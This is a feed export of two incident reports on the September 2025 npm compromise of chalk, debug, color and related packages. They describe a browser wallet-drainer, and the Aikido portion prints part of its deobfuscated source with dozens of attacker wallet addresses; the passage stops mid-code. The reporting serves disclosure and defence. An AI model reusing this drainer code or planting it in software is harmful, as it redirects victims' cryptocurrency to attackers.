npmjs.com These packages, about a billion downloads prior supports-hyperlinks chalk-template simple-swizzle slice-ansi error-ex is-arrayish wrap-ansi backslash color-string color-convert color color-name Thread follows. "></source></source></source></source></source></source></source></source></source></picture><figcaption><cite><a href="https://cyberplace.social/@GossiTheDog/115169390397282254%20">Kevin Beaumont on Mastodon </a></cite></figcaption> </figure><p>And pointed out the scale of the attack: <code>color</code> alone has ~32 million weekly downloads:</p><a href="https://fasterthanli.me#the-payload"><h2>The payload</h2></a><p>The complete payload is <a href="https://pastebin.com/bwLZrq02">available on pastebin</a>.</p><p>According to <a href="https://github.com/chalk/chalk/issues/656#issuecomment-3266900029">initial analysis</a>, it appears it&rsquo;s not meant to be running in a server environment, or on developers&rsquo; machines (in other words, not in nodejs/bun/etc.), but in the browser.</p><p>Which would mean that for the attack to be successful:</p><ul><li>Someone maintaining a crypto website/web-powered app would have to upgrade to the backdoored dependencies</li> <li>Those dependencies would have to be used on the front-end</li> <li>The crypto website would have had to be built, packaged, deployed</li> <li>Users of the website would&rsquo;ve had to make transactions with the drainer active</li> </ul><p>In other terms, I <em>think</em> that if all people did was accept a PR that bumped some dependencies, and some tests ran in CI, then nothing bad has happened, yet. But people are still figuring out exactly what the payload is supposed to do, and all the affected packages.</p><p>De-obfuscating the payload through <a href="https://obf-io.deobfuscate.io/">https://obf-io.deobfuscate.io/</a> yields good results, see <a href="https://gist.github.com/fasterthanlime/eba5b06c9cf2b39a525c51ae41ffcc00">this gist</a>.</p><p>I went a step further and did a <a href="https://github.com/fasterthanlime/0x112">loose port to TypeScript</a> to understand more of what&rsquo;s going on.</p><p>In short, <code>fetch</code> and <code>XMLHTTPRequest</code> are hooked so that any crypto addresses found in the response body that look like Bitcoin, Solana, Litecoin v2 etc. are modified to be one <a href="https://github.com/fasterthanlime/0x112/blob/main/consts.ts">of the many addresses controlled by the attacker</a>.</p><p>Note that only the response body is modified, not the request body. Presumably&hellip; this targets API calls that would request which address to send funds to, and do the transfer through some other means?</p><p>Additionally, every 500ms up to 50 times, <code>window.ethereum.request</code> is called to see if any Ethereum accounts have been authorized for use with <a href="https://docs.metamask.io/wallet/reference/provider-api">Metamask</a>. If so, <code>window.ethereum</code> is monkey-patched to alter various transactions to go attacker-controlled addresses.</p><p>In particular, it looks for:</p><ul><li><code>approve(address,uint256)</code> (0x095ea7b3) &mdash; replacing the destination &amp; maxing out the amount<ul><li>this codepath also logs the DEX name if known: Uniswap, PancakeSwap, 1inch, SushiSwap</li> </ul> </li> <li><code>permit(address,address,uint256,uint256,uint8,bytes32,bytes32)</code> (0xd505accf) &mdash; replacing the destination &amp; maxing out the value</li> <li><code>transfer(address,uint256)</code> (0xa9059cbb) &mdash; replacing the destination but keeping the amount</li> <li><code>transferFrom(address,address,uint256)</code> (0x23b872dd) &mdash; replacing the destination but keeping the amount</li> </ul><p>There&rsquo;s a Solana codepath as well, which changes various fields to <code>19111111111111111111111111111111</code>, but it&rsquo;s unclear to me whether that would do anything successfully.</p><a href="https://fasterthanli.me#current-situation"><h2>Current situation</h2></a><p><strong>Sep 8, 17:19 UTC</strong></p><p>NPM has contacted Josh and told him they are working to the remove the packages.</p><p>See <a href="https://github.com/debug-js/debug/issues/1005#issuecomment-3266868187">Josh&rsquo;s timestamped comment</a></p><p><strong>Sep 8, 17:11 UTC</strong></p><ul><li>John is still locked out of his npm account</li> <li><a href="https://github.com/chalk/chalk/issues/656">chalk was patched by Sindre</a></li> <li><a href="https://www.npmjs.com/package/simple-swizzle">simple-swizzle is still compromised</a></li> </ul> <figure><picture><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~3c7585127c3ce6fa.w400.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~354d0fdd43f337cb.w800.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~09e22de4ef77c1bc.w900.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~9d8366d50ab5815a.w1800.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~49b5414e0a55102d.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~49b5414e0a55102d.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~89c28cdef0558ca9.w400.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~cf1921a9063b9b4b.w800.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~3f899e43824b206d.w900.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~cbd731cd984b670a.w1800.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~ec3707dfa15312d8.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~ec3707dfa15312d8.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~5d348df9d95a4693.w400.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~48f7a9b55c9dede1.w800.webp 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~851cbfd8a8f4b386.w900.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~560df4965948f68a.w1800.webp 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~038fd6b0756a82ef.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~038fd6b0756a82ef.webp 2x"><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~49b5414e0a55102d.jxl" width="1204" height="675" title="see the obfuscated code starting with const _0x112fa8 " alt="Screenshot of npm showing simple-swizzle source code "></source></source></source></source></source></source></source></source></source></picture><figcaption><p>see the obfuscated code starting with const _0x112fa8</p><cite><a href="https://www.npmjs.com/package/simple-swizzle?activeTab=code%20">npm page for simple-swizzle, code tab </a></cite></figcaption> </figure><p>The npm team seems rather unresponsive given the urgency of the situation:</p><blockquote><p>It&rsquo;s been almost two hours without a single email back from npm. I am sitting here struggling to figure out what to do to fix any of this. The packages that have Sindre as a co-publisher have been published over but even he isn&rsquo;t able to yank the malicious versions AFAIU. If there&rsquo;s any ideas on what I should be doing, I&rsquo;m all ears.</p><p><a href="https://news.ycombinator.com/item?id=45170687">HN comment</a></p></blockquote><p>The best place to stay informed is probably <a href="https://cyberplace.social/@GossiTheDog/115169390397282254">Kevin&rsquo;s thread</a> on Mastodon.</p><p>(JavaScript is required to see this. Or maybe my stuff broke) </p><div><p>Here's another article just for you: </p></div></div><div class="gallery"><p><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/color-weekly-downloads@2x~5fb8d8f9274b135b.jxl"></p></div></section>]]></description><pubDate>Mon, 08 Sep 2025 23:42:26 +0530</pubDate></item><item><link>https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised</link><title>Largest NPM Compromise in History - Supply Chain Attack (aikido.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbqt4d/largest_npm_compromise_in_history_supply_chain/</guid><comments>https://www.reddit.com/r/programming/comments/1nbqt4d/largest_npm_compromise_in_history_supply_chain/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 83 min | <a href='https://www.reddit.com/r/programming/comments/1nbqt4d/largest_npm_compromise_in_history_supply_chain/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hey Everyone</p><p>We just discovered that around 1 hour ago packages with a total of 2 billion weekly downloads on npm were compromised all belonging to one developer <a href="https://www.npmjs.com/%7Eqix">https://www.npmjs.com/~qix</a></p><p>ansi-styles (371.41m downloads per week)<br/>debug (357.6m downloads per week)<br/>backslash (0.26m downloads per week)<br/>chalk-template (3.9m downloads per week)<br/>supports-hyperlinks (19.2m downloads per week)<br/>has-ansi (12.1m downloads per week)<br/>simple-swizzle (26.26m downloads per week)<br/>color-string (27.48m downloads per week)<br/>error-ex (47.17m downloads per week)<br/>color-name (191.71m downloads per week)<br/>is-arrayish (73.8m downloads per week)<br/>slice-ansi (59.8m downloads per week)<br/>color-convert (193.5m downloads per week)<br/>wrap-ansi (197.99m downloads per week)<br/>ansi-regex (243.64m downloads per week)<br/>supports-color (287.1m downloads per week)<br/>strip-ansi (261.17m downloads per week)<br/>chalk (299.99m downloads per week)</p><p>The compromises all stem from a core developers NPM account getting taken over from a phishing campaign</p><p>The malware itself, luckily, looks like its mostly intrested in crypto at the moment so its impact is smaller than if they had installed a backdoor for example.</p><h1>How the Malware Works (Step by Step)</h1><ol><li><strong>Injects itself into the browser</strong><ul><li>Hooks core functions like <code>fetch</code>, <code>XMLHttpRequest</code>, and wallet APIs (<code>window.ethereum</code>, Solana, etc.).</li><li>Ensures it can intercept both web traffic and wallet activity.</li></ul></li><li><strong>Watches for sensitive data</strong><ul><li>Scans network responses and transaction payloads for anything that looks like a wallet address or transfer.</li><li>Recognizes multiple formats across Ethereum, Bitcoin, Solana, Tron, Litecoin, and Bitcoin Cash.</li></ul></li><li><strong>Rewrites the targets</strong><ul><li>Replaces the legitimate destination with an attacker-controlled address.</li><li>Uses “lookalike” addresses (via string-matching) to make swaps less obvious.</li></ul></li><li><strong>Hijacks transactions before they’re signed</strong><ul><li>Alters Ethereum and Solana transaction parameters (e.g., recipients, approvals, allowances).</li><li>Even if the UI looks correct, the signed transaction routes funds to the attacker.</li></ul></li><li><strong>Stays stealthy</strong><ul><li>If a crypto wallet is detected, it avoids obvious swaps in the UI to reduce suspicion.</li><li>Keeps silent hooks running in the background to capture and alter real transactions</li></ul></li></ol><p>Our blog is being dynamically updated - <a href="https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised">https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised</a></p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://cdn.prod.website-files.com/642adcaf364024654c71df23/68beea4577bd0a48abb147d9_nx-compromise%20(2).png' /></section><section class='parsed-content'><div><div><div><div><p>Published on:</p><p>September 8, 2025</p></div><div><p>Last updated on:</p><p>September 8, 2025</p></div></div><div><p>Starting at September 8th, 13:16 UTC, our Aikido intel feed alerted us to a series packages being pushed to npm, which appeared to contains malicious code. These were 18 very popular packages,</p><ul><li>backslash (0.26m downloads per week)</li><li>chalk-template (3.9m downloads per week)</li><li>supports-hyperlinks (19.2m downloads per week)</li><li>has-ansi (12.1m downloads per week)</li><li>simple-swizzle (26.26m downloads per week)</li><li>color-string (27.48m downloads per week)</li><li>error-ex (47.17m downloads per week)</li><li>color-name (191.71m downloads per week)</li><li>is-arrayish (73.8m downloads per week)</li><li>slice-ansi (59.8m downloads per week)</li><li>color-convert (193.5m downloads per week)</li><li>wrap-ansi (197.99m downloads per week)</li><li>ansi-regex (243.64m downloads per week)</li><li>supports-color (287.1m downloads per week)</li><li>strip-ansi (261.17m downloads per week)</li><li>chalk (299.99m downloads per week)</li><li>debug (357.6m downloads per week)</li><li>ansi-styles (371.41m downloads per week)</li></ul><p>All together, these packages have more than 2 billion downloads per week. </p><p>The packages were updated to contain a piece of code that would be executed on the client of a website, which silently intercepts crypto and web3 activity in the browser, manipulates wallet interactions, and rewrites payment destinations so that funds and approvals are redirected to attacker-controlled accounts without any obvious signs to the user.</p><p>To avoid being compromised by packages like this, check out Aikido <a href="https://www.aikido.dev/blog/introducing-safe-chain">safe-chain</a>!</p><h2>What happened?</h2><p>The above packages all started having new versions released, an example here being is-arrayish:</p><figure></figure><p>We can see that the index.js file is modified, and contains obfuscated code:</p><figure></figure><p>&zwj;</p><p>After applying a bit of deobfuscation to it, we get a fairly complex piece of code still:</p><pre><code><span>var</span><span> neth = </span><span>; </span><span>var</span><span> rund = </span><span>; </span><span>var</span><span> loval = </span><span>; </span><span>async</span><span>function</span><span>checkethereumw</span><span>(</span><span>) </span><span>{ </span><span>try</span><span> { </span><span>const</span><span> _0x124ed3 = </span><span>await</span><span>window</span><span>.ethereum.request({ </span><span>'method'</span><span>: </span><span>"eth_accounts"</span> }); <span> </span><span>if</span><span> (_0x124ed3.length &gt; </span><span>) { </span> runmask(); <span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span><span> neth = </span><span>1</span><span>; </span> newdlocal(); } <span> } </span><span>else</span><span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span> newdlocal(); } <span> } </span><span>catch</span><span> (_0x53a897) { </span><span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span> newdlocal(); } } } <span>if</span><span> (</span><span>typeof</span><span>window</span><span> != </span><span>"undefined"</span><span> &amp;&amp; </span><span>typeof</span><span>window</span><span>.ethereum != </span><span>"undefined"</span><span>) { </span> checkethereumw(); <span>} </span><span>else</span><span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span> newdlocal(); } <span>function</span><span>newdlocal</span><span>(</span><span>) </span><span>{ </span><span>const</span><span> _0xba16ef = { </span><span>'zprkq'</span><span>: </span><span>function</span><span> (</span><span>_0x23e86b, _0x5b593c</span><span>) </span><span>{ </span><span>return</span><span> _0x23e86b + _0x5b593c; </span> }, <span>'iJAYR'</span><span>: </span><span>function</span><span> (</span><span>_0xc91263, _0x20ad3a</span><span>) </span><span>{ </span><span>return</span><span> _0xc91263 &lt;= _0x20ad3a; </span> }, <span>'nqxhl'</span><span>: </span><span>function</span><span> (</span><span>_0x31d70d, _0x545869</span><span>) </span><span>{ </span><span>return</span><span> _0x31d70d &lt;= _0x545869; </span> }, <span>'myaXd'</span><span>: </span><span>function</span><span> (</span><span>_0xd587f7, _0x356cb8</span><span>) </span><span>{ </span><span>return</span><span> _0xd587f7 === _0x356cb8; </span> }, <span>'IptyQ'</span><span>: </span><span>function</span><span> (</span><span>_0x52d73c, _0x1701dc</span><span>) </span><span>{ </span><span>return</span><span> _0x52d73c - _0x1701dc; </span> }, <span>'QCTBQ'</span><span>: </span><span>function</span><span> (</span><span>_0x3b97a6, _0x5cd5e9</span><span>) </span><span>{ </span><span>return</span><span> _0x3b97a6 - _0x5cd5e9; </span> }, <span>'avmeH'</span><span>: </span><span>function</span><span> (</span><span>_0x370f68, _0x51151b</span><span>) </span><span>{ </span><span>return</span><span> _0x370f68 - _0x51151b; </span> }, <span>'TwyPu'</span><span>: </span><span>function</span><span> (</span><span>_0x43ced5, _0x54174b</span><span>) </span><span>{ </span><span>return</span><span> _0x43ced5 + _0x54174b; </span> }, <span>'arczN'</span><span>: </span><span>function</span><span> (</span><span>_0x2b592d, _0x5339ba</span><span>) </span><span>{ </span><span>return</span><span> _0x2b592d - _0x5339ba; </span> }, <span>'yMgZR'</span><span>: </span><span>function</span><span> (</span><span>_0xb3fb8a, _0x24a479</span><span>) </span><span>{ </span><span>return</span><span> _0xb3fb8a - _0x24a479; </span> }, <span>'qEVKr'</span><span>: </span><span>function</span><span> (</span><span>_0x4a3a26, _0x16853b</span><span>) </span><span>{ </span><span>return</span><span> _0x4a3a26 - _0x16853b; </span> }, <span>'vGpiX'</span><span>: </span><span>function</span><span> (</span><span>_0x9c66ab, _0x1a38b9, _0x1d740b</span><span>) </span><span>{ </span><span>return</span><span> _0x9c66ab(_0x1a38b9, _0x1d740b); </span> }, <span>'eGWOd'</span><span>: </span><span>function</span><span> (</span><span>_0x3630fa, _0x17694b</span><span>) </span><span>{ </span><span>return</span><span> _0x3630fa &lt; _0x17694b; </span> }, <span>'tfqRA'</span><span>: </span><span>function</span><span> (</span><span>_0x562199, ..._0x1555b8</span><span>) </span><span>{ </span><span>return</span><span> _0x562199(..._0x1555b8); </span> }, <span>'viQtk'</span><span>: </span><span>"Content-Type"</span><span>, </span><span>'DSXar'</span><span>: </span><span>"application/json"</span><span>, </span><span>'mDaWt'</span><span>: </span><span>function</span><span> (</span><span>_0x2116fd, _0x26f622</span><span>) </span><span>{ </span><span>return</span><span> _0x2116fd(_0x26f622); </span> }, <span>'FXtyf'</span><span>: </span><span>function</span><span> (</span><span>_0x4f1346, _0x53343b</span><span>) </span><span>{ </span><span>return</span><span> _0x4f1346 === _0x53343b; </span> }, <span>'FYAPh'</span><span>: </span><span>"string"</span><span>, </span><span>'UmfJm'</span><span>: </span><span>function</span><span> (</span><span>_0x301d56, _0x29139b</span><span>) </span><span>{ </span><span>return</span><span> _0x301d56 === _0x29139b; </span> }, <span>'LmXxC'</span><span>: </span><span>function</span><span> (</span><span>_0x467473, _0x5d7154</span><span>) </span><span>{ </span><span>return</span><span> _0x467473(_0x5d7154); </span> }, <span>'yVHgJ'</span><span>: </span><span>"responseText"</span><span>, </span><span>'aXpuC'</span><span>: </span><span>"response"</span><span>, </span><span>'yArwb'</span><span>: </span><span>"object"</span><span>, </span><span>'MJKcn'</span><span>: </span><span>function</span><span> (</span><span>_0x5561bf, _0x1792e6</span><span>) </span><span>{ </span><span>return</span><span> _0x5561bf !== _0x1792e6; </span> }, <span>'gHrJP'</span><span>: </span><span>function</span><span> (</span><span>_0xe2c323, _0x4c49d0</span><span>) </span><span>{ </span><span>return</span><span> _0xe2c323 === _0x4c49d0; </span> }, <span>'OiGzk'</span><span>: </span><span>"1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx"</span><span>, </span><span>'EAhsy'</span><span>: </span><span>"1Li1CRPwjovnGHGPTtcKzy75j37K6n97Rd"</span><span>, </span><span>'lLQUz'</span><span>: </span><span>"1Dk12ey2hKWJctU3V8Akc1oZPo1ndjbnjP"</span><span>, </span><span>'ibPEr'</span><span>: </span><span>"1NBvJqc1GdSb5uuX8vT7sysxtT4LB8GnuY"</span><span>, </span><span>'cGpnb'</span><span>: </span><span>"1Mtv6GsFsbno9XgSGuG6jRXyBYv2tgVhMj"</span><span>, </span><span>'wAGlT'</span><span>: </span><span>"1BBAQm4DL78JtRdJGEfzDBT2PBkGyvzf4N"</span><span>, </span><span>'Hauzr'</span><span>: </span><span>"1KkovSeka94yC5K4fDbfbvZeTFoorPggKW"</span><span>, </span><span>'nJNgC'</span><span>: </span><span>"18CPyFLMdncoYccmsZPnJ5T1hxFjh6aaiV"</span><span>, </span><span>'EHOlV'</span><span>: </span><span>"1BijzJvYU2GaBCYHa8Hf3PnJh6mjEd92UP"</span><span>, </span><span>'cOZYT'</span><span>: </span><span>"1Bjvx6WXt9iFB5XKAVsU3TgktgeNbzpn5N"</span><span>, </span><span>'cIySf'</span><span>: </span><span>"19fUECa9aZCQxcLeo8FZu8kh5kVWheVrg8"</span><span>, </span><span>'rrGeC'</span><span>: </span><span>"1DZEep7GsnmBVkbZR3ogeBQqwngo6x4XyR"</span><span>, </span><span>'geUVS'</span><span>: </span><span>"1GX1FWYttd65J26JULr9HLr98K7VVUE38w"</span><span>, </span><span>'TZdxq'</span><span>: </span><span>"14mzwvmF2mUd6ww1gtanQm8Bxv3ZWmxDiC"</span><span>, </span><span>'JgcFw'</span><span>: </span><span>"1EYHCtXyKMMhUiJxXJH4arfpErNto5j87k"</span><span>, </span><span>'gKbQq'</span><span>: </span><span>"19D1QXVQCoCLUHUrzQ4rTumqs9jBcvXiRg"</span><span>, </span><span>'KObJu'</span><span>: </span><span>"16mKiSoZNTDaYLBQ5LkunK6neZFVV14b7X"</span><span>, </span><span>'vYGdx'</span><span>: </span><span>"18x8S4yhFmmLUpZUZa3oSRbAeg8cpECpne"</span><span>, </span><span>'gtZOV'</span><span>: </span><span>"1EkdNoZJuXTqBeaFVzGwp3zHuRURJFvCV8"</span><span>, </span><span>'ApfqP'</span><span>: </span><span>"13oBVyPUrwbmTAbwxVDMT9i6aVUgm5AnKM"</span><span>, </span><span>'hgmsX'</span><span>: </span><span>"1DwsWaXLdsn4pnoMtbsmzbH7rTj5jNH6qS"</span><span>, </span><span>'TNgNB'</span><span>: </span><span>"13wuEH28SjgBatNppqgoUMTWwuuBi9e4tJ"</span><span>, </span><span>'UhmAX'</span><span>: </span><span>"154jc6v7YwozhFMppkgSg3BdgpaFPtCqYn"</span><span>, </span><span>'vXyJx'</span><span>: </span><span>"1AP8zLJE6nmNdkfrf1piRqTjpasw7vk5rb"</span><span>, </span><span>'HmJHn'</span><span>: </span><span>"19F8YKkU7z5ZDAypxQ458iRqH2ctGJFVCn"</span><span>, </span><span>'UlhFZ'</span><span>: </span><span>"17J3wL1SapdZpT2ZVX72Jm5oMSXUgzSwKS"</span><span>, </span><span>'VShzV'</span><span>: </span><span>"16z8D7y3fbJsWFs3U8RvBF3A8HLycCW5fH"</span><span>, </span><span>'IzSNV'</span><span>: </span><span>"1PYtCvLCmnGDNSVK2gFE37FNSf69W2wKjP"</span><span>, </span><span>'hiXcO'</span><span>: </span><span>"143wdqy6wgY3ez8Nm19AqyYh25AZHz3FUp"</span><span>, </span><span>'gwsfo'</span><span>: </span><span>"1JuYymZbeoDeH5q65KZVG3nBhYoTK9YXjm"</span><span>, </span><span>'XjToi'</span><span>: </span><span>"1PNM2L1bpJQWipuAhNuB7BZbaFLB3LCuju"</span><span>, </span><span>'qzLJJ'</span><span>: </span><span>"19onjpqdUsssaFKJjwuAQGi2eS41vE19oi"</span><span>, </span><span>'NrttU'</span><span>: </span><span>"1JQ15RHehtdnLAzMcVT9kU8qq868xFEUsS"</span><span>, </span><span>'mLamd'</span><span>: </span><span>"1LVpMCURyEUdE8VfsGqhMvUYVrLzbkqYwf"</span><span>, </span><span>'ENfnx'</span><span>: </span><span>"1KMcDbd2wecP4Acoz9PiZXsBrJXHbyPyG6"</span><span>, </span><span>'teGcp'</span><span>: </span><span>"1DZiXKhBFiKa1f6PTGCNMKSU1xoW3Edb7Z"</span><span>, </span><span>'lkQtS'</span><span>: </span><span>"174bEk62kr8dNgiduwHgVzeLgLQ38foEgZ"</span><span>, </span><span>'nVfSu'</span><span>: </span><span>"17cvmxcjTPSBsF1Wi2HfcGXnpLBSzbAs6p"</span><span>, </span><span>'XdmQg'</span><span>: </span><span>"1NoYvnedUqNshKPZvSayfk8YTQYvoB2wBc"</span><span>, </span><span>'hTAuL'</span><span>: </span><span>"13694eCkAtBRkip8XdPQ8ga99KEzyRnU6a"</span><span>, </span><span>'hmVdI'</span><span>: </span><span>"bc1qms4f8ys8c4z47h0q29nnmyekc9r74u5ypqw6wm"</span><span>, </span><span>'SvssU'</span><span>: </span><span>"bc1qznntn2q7df8ltvx842upkd9uj4atwxpk0whxh9"</span><span>, </span><span>'zXlNj'</span><span>: </span><span>"bc1q4rllc9q0mxs827u6vts2wjvvmel0577tdsvltx"</span><span>, </span><span>'OOAQz'</span><span>: </span><span>"bc1qj8zru33ngjxmugs4sxjupvd9cyh84ja0wjx9c4"</span><span>, </span><span>'TDfnH'</span><span>: </span><span>"bc1qc972tp3hthdcufsp9ww38yyer390sdc9cvj8ar"</span><span>, </span><span>'UrAmA'</span><span>: </span><span>"bc1qw0z864re8yvrjqmcw5fs6ysndta2avams0c6nh"</span><span>, </span><span>'ELPqV'</span><span>: </span><span>"bc1qzdd8c7g2g9mnnxy635ndntem2827ycxxyn3v4h"</span><span>, </span><span>'xlnbk'</span><span>: </span><span>"bc1qaavgpwm98n0vtaeua539gfzgxlygs8jpsa0mmt"</span><span>, </span><span>'aApMn'</span><span>: </span><span>"bc1qrdlkyhcrx4n2ksfjfh78xnqrefvsr34nf2u0sx"</span><span>, </span><span>'Pvsjl'</span><span>: </span><span>"bc1q9ytsyre66yz56x3gufhqks7gqd8sa8uk4tv5fh"</span><span>, </span><span>'fmvYL'</span><span>: </span><span>"bc1qfrvsj2dkey2dg8ana0knczzplcqr7cgs9s52vq"</span><span>, </span><span>'fXywx'</span><span>: </span><span>"bc1qg7lkw04hg5yggh28ma0zvtkeg95k0yefqmvv2f"</span><span>, </span><span>'RRxbR'</span><span>: </span><span>"bc1qmeplum3jy2vrlyzw4vhrcgeama35tr9kw8yfrn"</span><span>, </span><span>'VrdPL'</span><span>: </span><span>"bc1qamqx0h8rxfcs4l56egrpau4ryqu4r642ttmxq4"</span><span>, </span><span>'qSKMT'</span><span>: </span><span>"bc1qsaxgtck26mgecgfvp9ml4y5ljyl8ylpdglqz30"</span><span>, </span><span>'mbTQq'</span><span>: </span><span>"bc1qsz90ulta8dx5k8xzzjqruzahav2vxchtk2l8v7"</span><span>, </span><span>'xHmCb'</span><span>: </span><span>"bc1q3ad2zyc5mpc9nnzmmtxqpu467jeh4m928r7qf4"</span><span>, </span><span>'OqeMw'</span><span>: </span><span>"bc1qlrdqrulwmvfg86rmp77k8npdefns52ykk8cxs6"</span><span>, </span><span>'BNnlw'</span><span>: </span><span>"bc1q5hqxk5ugvf2d3y6qj2a7cy7u79ckusu9eknpsr"</span><span>, </span><span>'FkDWd'</span><span>: </span><span>"bc1qszm3nugttmtpkq77dhphtqg4u7vuhxxcrh7f79"</span><span>, </span><span>'aBdRe'</span><span>: </span><span>"bc1qqc09xnyafq0y4af3x7j5998tglxcanjuzy974m"</span><span>, </span><span>'roief'</span><span>: </span><span>"bc1qqqh29zxfzxk0fvmq9d7hwedh5yz44zhf7e23qz"</span><span>, </span><span>'qMxmV'</span><span>: </span><span>"bc1qsg57tpvfj6gysrw5w4sxf3dweju40g87uuclvu"</span><span>, </span><span>'kkYGi'</span><span>: </span><span>"bc1qje95nehs8y0wvusp2czr25p7kghk6j3cvgugy5"</span><span>, </span><span>'zbnSH'</span><span>: </span><span>"bc1qwrnchp96p38u8ukp8jc8cq22q35n3ajfav0pzf"</span><span>, </span><span>'dHxYm'</span><span>: </span><span>"bc1q6l99s704jccclxx5rc2x2c5shlgs2pg0fpnflk"</span><span>, </span><span>'OfXMz'</span><span>: </span><span>"bc1qeuk2u6xl4rgfq0x9yc37lw49kutnd8gdlxt9st"</span><span>, </span><span>'OZznV'</span><span>: </span><span>"bc1qxul8lwxvt7lt9xuge0r2jls7evrwyyvcf2ah0u"</span><span>, </span><span>'NHzcN'</span><span>: </span><span>"bc1qcplvxyzs9w09g6lpglj6xxdfxztfwjsgz95czd"</span><span>, </span><span>'sxqWF'</span><span>: </span><span>"bc1q9ca9ae2cjd3stmr9lc6y527s0x6vvqys6du00u"</span><span>, </span><span>'oIQra'</span><span>: </span><span>"bc1qmap3cqss3t4vetg8z9s995uy62jggyxjk29jkp"</span><span>, </span><span>'qIAwe'</span><span>: </span><span>"bc1qg3c6c7y5xeqkxnjsx9ymclslr2sncjrxjylkej"</span><span>, </span><span>'IneJW'</span><span>: </span><span>"bc1q9zx63qdjwldxp4s9egeqjelu3y5yqsajku8m29"</span><span>, </span><span>'tjIgE'</span><span>: </span><span>"bc1ql2awtv7nzcp2dqce3kny2ra3dz946c9vg2yukq"</span><span>, </span><span>'vuJMD'</span><span>: </span><span>"bc1qhytpe64tsrrvgwm834q35w6607jc6azqtnvl2a"</span><span>, </span><span>'Uxzul'</span><span>: </span><span>"bc1q4rlgfgjwg9g2pqwqkf5j9hq6ekn39rjmzv09my"</span><span>, </span><span>'MoAYB'</span><span>: </span><span>"bc1q28ks0u6fhvv7hktsavnfpmu59anastfj5sq8dw"</span><span>, </span><span>'wKaGs'</span><span>: </span><span>"bc1qjqfpxvl2j2hzx2cxeqhchrh02dcjy3z5k6gv55"</span><span>, </span><span>'VmOdy'</span><span>: </span><span>"bc1q8zznzs9z93xpkpunrmeqp6fg54s3q7dkh9z9xw"</span><span>, </span><span>'YcvKY'</span><span>: </span><span>"bc1qt4c4e6xwt5dz4p629ndz9zmeep2kmvqgy53037"</span><span>, </span><span>'FlhWy'</span><span>: </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>, </span><span>'sCKdW'</span><span>: </span><span>"0xa29eeFb3f21Dc8FA8bce065Db4f4354AA683c024"</span><span>, </span><span>'ZAiba'</span><span>: </span><span>"0x40C351B989113646bc4e9Dfe66AE66D24fE6Da7B"</span><span>, </span><span>'AsHKD'</span><span>: </span><span>"0x30F895a2C66030795131FB66CBaD6a1f91461731"</span><span>, </span><span>'rzrhZ'</span><span>: </span><span>"0x57394449fE8Ee266Ead880D5588E43501cb84cC7"</span><span>, </span><span>'expPy'</span><span>: </span><span>"0xCd422cCC9f6e8f30FfD6F68C0710D3a7F24a026A"</span><span>, </span><span>'zlBwY'</span><span>: </span><span>"0x7C502F253124A88Bbb6a0Ad79D9BeD279d86E8f4"</span><span>, </span><span>'nElAL'</span><span>: </span><span>"0xe86749d6728d8b02c1eaF12383c686A8544de26A"</span><span>, </span><span>'wqRjK'</span><span>: </span><span>"0xa4134741a64F882c751110D3E207C51d38f6c756"</span><span>, </span><span>'HcYDT'</span><span>: </span><span>"0xD4A340CeBe238F148034Bbc14478af59b1323d67"</span><span>, </span><span>'BqNRF'</span><span>: </span><span>"0xB00A433e1A5Fc40D825676e713E5E351416e6C26"</span><span>, </span><span>'OvURa'</span><span>: </span><span>"0xd9Df4e4659B1321259182191B683acc86c577b0f"</span><span>, </span><span>'PFfEj'</span><span>: </span><span>"0x0a765FA154202E2105D7e37946caBB7C2475c76a"</span><span>, </span><span>'IOjJb'</span><span>: </span><span>"0xE291a6A58259f660E8965C2f0938097030Bf1767"</span><span>, </span><span>'uKfqV'</span><span>: </span><span>"0xe46e68f7856B26af1F9Ba941Bc9cd06F295eb06D"</span><span>, 